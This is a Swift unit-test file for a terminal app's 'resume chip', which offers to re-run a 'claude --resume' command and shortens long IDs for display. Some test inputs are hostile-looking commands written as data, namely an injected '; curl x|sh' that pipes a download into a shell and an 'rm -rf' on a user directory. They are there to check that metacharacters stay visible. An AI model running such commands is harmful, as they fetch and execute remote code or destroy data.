import Foundation
import XCTest
import TarmacKit

/// 2611.0011 S8, S20, S21: the resume chip's offer, its one reducer, and what
/// the chip shows.
final class ResumeOfferTests: XCTestCase {
    private let uuid = "claude --resume 3f2a1b9c-0000-4000-8000-000000000000"

    private func offer(_ cmd: String = "claude --resume 3f2a1b9c-0000-4000-8000-000000000000") throws -> ResumeOffer {
        try XCTUnwrap(ResumeOffer.make(cmd: cmd))
    }

    private func armed(_ cmd: String = "claude --resume 3f2a1b9c-0000-4000-8000-000000000000") throws -> ResumeOffer {
        try XCTUnwrap(ResumeOffer.step(try offer(cmd), .output(byteCount: 5)).offer)
    }

    // MARK: S8

    func testS8TheChipShowsTheShortenedCommandWithNoKeyHintBeforeTheShellIsUp() throws {
        let model = ResumeChip.model(offer: try offer(), prime: true)
        XCTAssertEqual(model.text, "↻ last here: claude --resume 3f2a…")
        XCTAssertEqual(model.toolTip, uuid)
    }

    func testS8AnEmptyChunkDoesNotArmAndAChunkArmsOnlyThePrimeCardsHint() throws {
        let empty = try XCTUnwrap(ResumeOffer.step(try offer(), .output(byteCount: 0)).offer)
        XCTAssertFalse(empty.armed(prime: true))
        let up = try armed()
        XCTAssertTrue(up.armed(prime: true))
        XCTAssertFalse(up.armed(prime: false))
        XCTAssertTrue(ResumeChip.model(offer: up, prime: true).text.hasSuffix("  ⏎ run · esc skip"))
        XCTAssertFalse(ResumeChip.model(offer: up, prime: false).text.contains("⏎"))
    }

    func testS8ReturnOnTheArmedPrimeCardRunsTheCommandAndOneCarriageReturnOnce() throws {
        let (gone, effect) = ResumeOffer.step(try armed(), .returnKey(prime: true))
        XCTAssertNil(gone)
        XCTAssertEqual(effect, .run(Data(uuid.utf8) + Data([0x0D])))

        let (stillGone, again) = ResumeOffer.step(gone, .returnKey(prime: true))
        XCTAssertNil(stillGone)
        XCTAssertNil(again)
    }

    func testS8ReturnBeforeTheShellIsUpOrOnACardThatIsNotPrimeDoesNothing() throws {
        let notUp = try offer()
        let (kept, effect) = ResumeOffer.step(notUp, .returnKey(prime: true))
        XCTAssertEqual(kept, notUp)
        XCTAssertNil(effect)

        let up = try armed()
        let (keptUp, effectUp) = ResumeOffer.step(up, .returnKey(prime: false))
        XCTAssertEqual(keptUp, up)
        XCTAssertNil(effectUp)
    }

    func testS8MoreOutputKeepsAnArmedOfferArmed() throws {
        let again = try XCTUnwrap(ResumeOffer.step(try armed(), .output(byteCount: 5)).offer)
        XCTAssertTrue(again.armed(prime: true))
    }

    func testS8NoOfferStaysNoOffer() {
        for event in [ResumeOffer.Event.output(byteCount: 5), .userInput] {
            let (offer, effect) = ResumeOffer.step(nil, event)
            XCTAssertNil(offer, "\(event)")
            XCTAssertNil(effect, "\(event)")
        }
    }

    func testS8NoCommandOrARefusedOneMakesNoOffer() {
        XCTAssertNil(ResumeOffer.make(cmd: nil))
        XCTAssertNil(ResumeOffer.make(cmd: "echo a\necho b"))
    }

    // MARK: S20

    /// Each row is an offer in another state, and the Return that follows
    /// it is one that would have run that offer had it survived.
    func testS20AnyUserByteDropsTheOfferInEveryState() throws {
        let cases: [(String, ResumeOffer, Bool)] = [
            ("not yet armed, then Return once armed", try offer("echo one"), true),
            ("armed, on a card that is not prime", try armed("echo two"), false),
            ("armed, on the prime card, with \"a\"", try armed("echo three"), true),
            ("armed, with an Esc byte", try armed(uuid), true),
        ]
        for (name, offer, prime) in cases {
            let (dropped, effect) = ResumeOffer.step(offer, .userInput)
            XCTAssertNil(dropped, name)
            XCTAssertNil(effect, name)
            let armedAgain = ResumeOffer.step(dropped, .output(byteCount: 5)).offer
            XCTAssertNil(ResumeOffer.step(armedAgain, .returnKey(prime: prime)).effect, name)
        }
    }

    // MARK: S21

    func testS21AMetacharacterIsNeverHidden() {
        let shown = ResumeChip.display("claude --resume 3f2a1b9c-0000-4000-8000-000000000000; curl x|sh")
        XCTAssertTrue(shown.contains("; curl x|sh"), shown)
        XCTAssertTrue(shown.hasPrefix("claude --resume 3f2a1b9c"), shown)
    }

    func testS21APathWithNoIdLikeWordIsUnchanged() {
        XCTAssertEqual(ResumeChip.display("rm -rf /Users/u/work/important-directory"), "rm -rf /Users/u/work/important-directory")
    }

    func testS21AFlagStaysWhole() {
        XCTAssertEqual(
            ResumeChip.display("claude --dangerously-skip-permissions --resume 3f2a1b9c-0000-4000-8000-000000000000"),
            "claude --dangerously-skip-permissions --resume 3f2a…"
        )
        XCTAssertEqual(ResumeChip.display("x --resume-12345678901"), "x --resume-12345678901")
    }

    func testS21ALongWordWithNoDigitStaysWhole() {
        XCTAssertEqual(ResumeChip.display("cd important-directory"), "cd important-directory")
    }

    func testAnIdOfTwelveCharactersStaysWholeAndThirteenIsShortened() {
        XCTAssertEqual(ResumeChip.display("x abcdefghij12"), "x abcdefghij12")
        XCTAssertEqual(ResumeChip.display("x abcdefghij123"), "x abcd…")
    }

    func testTheSpacingIsKeptVerbatim() {
        XCTAssertEqual(ResumeChip.display("a  b 3f2a1b9c-0000-4000"), "a  b 3f2a…")
    }
}
